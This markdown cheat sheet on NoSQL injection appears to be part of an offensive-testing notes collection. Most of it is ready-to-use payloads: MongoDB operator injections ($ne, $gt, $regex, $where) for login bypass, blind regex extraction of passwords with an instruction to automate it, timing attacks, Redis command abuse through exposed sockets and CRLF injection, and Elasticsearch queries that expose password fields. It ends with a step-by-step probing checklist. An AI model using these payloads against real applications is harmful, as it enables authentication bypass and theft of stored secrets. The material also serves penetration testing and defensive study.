# NoSQL Injection

Mongo/Redis/Elastic take structured queries. Injection means supplying structure where a
scalar is expected.

---

## MongoDB operators

```
{"user":"admin","pass":{"$ne":null}}
{"user":{"$gt":""},"pass":{"$gt":""}}
{"user":"admin","pass":{"$regex":"^a"}}
{"$or":[{"user":"admin"},{"user":"root"}]}
```

In a form body, `user[$ne]=x&pass[$ne]=x`.

---

## Auth bypass set

```
user=admin&pass[$ne]=1
user[$gt]=&pass[$gt]=
user=admin&pass[$regex]=.*
{"user":"admin","pass":{"$ne":"x"}}
{"user":{"$regex":"^adm"},"pass":{"$ne":"x"}}
```

---

## Extraction (blind)

```
pass[$regex]=^a
pass[$regex]=^ab
```

Each prefix that returns 200 extends the secret. Automate it.

---

## Where else

- Query-string JSON: `?filter={"price":{"$gt":0}}`
- `$where` with JS: `{"$where":"this.a=='b'"}`, and `sleep()` for timing.
- Aggregation `$lookup` for cross-collection reads.
- Sort injection: `?sort={"$natural":1}`.

---

## Redis

Not injection in the SQL sense, but:

- `KEYS *`, `CONFIG GET *`, `INFO` if the socket is exposed.
- CRLF in a value that is concatenated into a command.
- `EVAL` for Lua execution.

---

## Elasticsearch

- `?q=_exists_:password`
- Query DSL injection: `{"query":{"wildcard":{"name":"*"}}}`
- Script fields for computation.

---

## Go deeper

1. Try `$ne`, `$gt`, `$regex`, `$where`, `$exists`, `$in` in that order.
2. Try the same operators in JSON, form-encoded, and query-string forms.
3. Test whether the ORM coerces `"1"` to `1` (type confusion).
4. Test the sort and projection parameters.

---

## Related

- `03-bypass/bypass-doctrine.md`
- `00-core/impact-proof.md`
- `11-regex/10-verification.md`
